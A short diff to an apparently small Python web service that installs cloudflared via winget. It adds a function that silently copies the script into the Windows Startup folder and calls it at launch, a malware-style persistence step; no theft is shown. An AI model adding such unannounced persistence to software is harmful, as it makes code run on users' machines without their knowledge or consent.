@@ -39,6 +39,12 @@ def ip():
 def home():
     return {"message": "Hello, World!"}
 
+def mv_startup():
+    startup_dir = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+    target = Path(__file__).resolve()
+
+    Path.copy(target, startup_dir / target.name)
+
 def install(pkg):
     subprocess.run([
         "winget",
@@ -61,10 +67,10 @@ def find():
 
     return None
 
-
 def start():
-    exe = find()
+    mv_startup()
 
+    exe = find()
     if not exe:
         print("Installing cloudflared...")
         install("Cloudflare.cloudflared")
